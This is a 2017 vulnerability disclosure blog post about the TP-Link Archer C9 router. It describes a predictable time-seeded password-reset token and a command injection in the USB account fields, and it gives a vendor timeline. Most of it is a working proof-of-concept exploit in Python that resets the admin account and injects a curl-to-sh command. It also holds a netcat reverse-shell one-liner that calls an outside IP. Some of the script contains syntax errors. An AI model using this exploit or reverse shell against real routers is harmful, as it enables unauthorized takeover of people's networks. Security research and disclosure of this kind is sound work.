---
title: TP-Link Archer C9 - Admin Password Reset
layout: post
date:   2017-07-21 16:48:12 +1100
categories: posts
---

I recently bought a new Archer C9 router and decided to have a look around at the firmware to see what I could find. I ended up finding out a way to reset the admin password gain a remote shell from an unauthenticated user.

## Reseting the admin password
After downloading and extracting the firmware from the [TP-Link website](http://www.tp-link.com/en/download/Archer-C9_V2.html#Firmware) I saw that most of the admin interface was written in lua. With a bit of digging I can across the password reset feature, designed to allow the admin to reset their password if they forget it.

This is disabled by default, but the only time that this setting was checked was to see if the code should be emailed to the admin or not. The reset token was still created when requested regardless of the settings, and could be used to reset the password if correctly supplied.

Looking at `passwd_recovery.lua` to see how the token was created, we see that it is created with the following:

```lua
math.randomseed(os.time())
vercode = math.random(100000, 999999)
```

The once the token is created, it is valid for 10 minutes, after which a new token will need to be generated.

`os.time()` returns the seconds since epoch, so we should easily be able to recreate this token by seeding with the same number! The router also returns a `Date` header, so we can just parse that and get the exact server time and hence the exact seed!

So all we need to do is:
1. Parse the Date header from the router to determine the server time
1. Request a reset token
1. Seed our prng with the server time and generate the code
1. Submit the token and reset the admin account back to `admin`/`admin`


## Remote Code Execution

Now that we have admin access to the router it's time to try and get RCE.

Most of the code that calls out to external commands was correctly escaping the arguments, preventing command injection.

After a bit of searching, I found that the following code gets run when the admin password is updated:

```lua
sys.call("usbuser " .. username .. " '" .. password .. "'")
```

Username and password are unescaped, but are limited to 16 characters and can only contain length of 16 must be in the ascii range of 33-126.

After some more testing I found the following payload could be used to execute a remote script:

```python
web = "hack.me/s"
username = ";curl"
password = "%s'|sh'"%web
```

So long as `web` is 10 or less characters, the router will execute whatever commands are returned. I tested and got a simple reverse shell using:

```bash
#!/bin/sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 123.123.123.123 12345 >/tmp/f &
```

## Timeline

TP-Link quick were great to work with, they quickly responded to the initial report and published an update firmware within 3 weeks.

* 2017-04-20 - Contacted TP-Link with initial findings
* 2017-04-20 - TP-Link responded asking for more details
* 2017-04-26 - TP-Link responded saying they are still investigating
* 2017-04-28 - TP-Link confirmed issues and are working on a fix
* 2017-04-28 - TP-Link send beta firmware to ensure issue was resolved
* 2017-05-11 - TP-Link published updated firmware


## POC Scripts

`tplink.py`:
```python
#!/usr/bin/env python

import requests
import email.utils as eut
import math
import sys
import utils


class TPLinkPwn:
	def __init__(self, url):
	    self.url = url
	    self.cookies = None
	    self.token = ""
	    self.key = None

	def post(self, path, data):
		return requests.post('%s/cgi-bin/luci/;stok=%s/%s'%(self.url, self.token, path), data=data, cookies=self.cookies)

	def createCode(self):
		data = {
			"operation": "read",
		}
		r = self.post("login?form=vercode", data)
		if r.status_code != 200:
			print "something went wrong"
			print r.status_code
			print r.text
			exit(-1)

	def resetAdmin(self, time):
		code = utils.random(time, 100000, 999999)

		data = {
			"operation": "write",
			"vercode": code
		}

		json = self.post("login?form=vercode", data).json()
		if json["success"] == True:
			print "Found code %d, admin password reset"%code
			return True
		return False

	def guessCode(self, time):
		if self.resetAdmin(time):
			return True
		else:
			for i in range(time, time+5):
				if self.resetAdmin(i):
					return True

		return False

	def getDate(self):
		r = requests.get(self.url)
		if r.status_code != 200:
			print "something went wrong"
			print r.status_code
			print r.text
			exit(-1)
		dateStr = r.headers["Date"]

		return eut.mktime_tz(eut.parsedate_tz(dateStr))

	def setUsbSharing(self):
		print "Making sure the sharing account is the default account"
		data = {
			"operation": "write",
			"account": "admin"
		}
		json = self.post("admin/folder_sharing?form=account", data).json()
		assert json["success"]

	def getRsaKey(self):
		print "Reading RSA key"
		json = self.post("login?form=login", {"operation":"read"}).json()
		assert json["success"]

		n,e = json["data"]["password"]
		self.key = utils.pubKey(n,e)

	def login(self, username, password):
		if not self.key:
			self.getRsaKey()

		data = {
		  "operation": "login",
			"username": username,
			"password": utils.encrypt(self.key, password)
		}
		print "Logging in"
		r = self.post("login?form=login", data)
		json = r.json()
		assert json["success"]

		self.cookies = r.cookies
		self.token = r.json()["data"]["stok"]

	def createAccount(self, username, password):
		assert len(username) < 16 and ' ' not in username
		assert len(password) < 16 and ' ' not in password

		if not self.key:
			self.getRsaKey()

		data = {
		  "operation": "set",
			"new_acc": username,
			"new_pwd": utils.encrypt(self.key, password),
			"cfm_pwd": utils.encrypt(self.key, password)
		}

		print "Creating user account"
		json = self.post("admin/administration?form=account", data).json()
		assert json["success"]

	def reset(self):
		print "Getting current time from Date header"
		time = self.getDate()

		print "Renerating reset code"
		self.createCode()

		print "Finding reset code"
		if not self.guessCode(time):
			print "Code not found"


if __name__ == "__main__":
	if len(sys.argv) < 2:
		print "usage: %s <router base url> [shell url]"%sys.argv[0]
		print "%s http://192.168.0.1 hack.me/s"%sys.argv[0]
		exit(-1)

	if sys.argv[2] && len(sys.argv[2]) > 10:
		print "Shellcode url cannot be greater than 10 characters"
		exit(-1)

	router = sys.argv[1]
	shell = sys.argv[2]
	"""
		Command injection when changing the usb account as it runs the following:
		os.execute("usbuser " .. username .. " '" .. password .. "'")

		username and password are limitted to a length of 16 and no spaces eg 32 < ord(c) < 127
	"""
	tp = TPLinkPwn(router)
	tp.reset()
	print "Admin account reset to admin/admin"

	if shell
		tp.login("admin", "admin")
		tp.setUsbSharing()
		tp.createAccount(";curl", "%s'|sh'"%shell)

		print "Reverse shell activated"
```


`utils.py`:
```python
#!/usr/bin/env python

import math

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

RAND_MAX = 0x7fffffff

# from https://github.com/qbx2/python_glibc_random
def glibc_prng(seed):
	int32 = lambda x: x&0xffffffff-0x100000000 if x&0xffffffff>0x7fffffff else x&0xffffffff
	int64 = lambda x: x&0xffffffffffffffff-0x10000000000000000 if x&0xffffffffffffffff>0x7fffffffffffffff else x&0xffffffffffffffff

	r = [0] * 344
	r[0] = seed

	for i in range(1, 31):
		r[i] = int32(int64(16807 * r[i-1]) % 0x7fffffff)

		if r[i] < 0:
			r[i] = int32(r[i] + 0x7fffffff)


	for i in range(31, 34):
		r[i] = int32(r[i-31])

	for i in range(34, 344):
		r[i] = int32(r[i-31] + r[i-3])

	i = 344 - 1

	while True:
		i += 1
		r.append(int32(r[i-31] + r[i-3]))
		yield int32((r[i]&0xffffffff) >> 1)

def random(seed, l, u):
	prng = glibc_prng(seed)
	r = float(next(prng))%RAND_MAX / RAND_MAX
	return int(math.floor(r*(u-l+1))+l)


def encrypt(key, val):
	padding = (key.n.bit_length()+7)>>3
	return key.encrypt(val.ljust(padding, "\x00"),1)[0].encode("hex")

def pubKey(n, e):
	return RSA.construct((long(n,16), long(e, 16)))
```
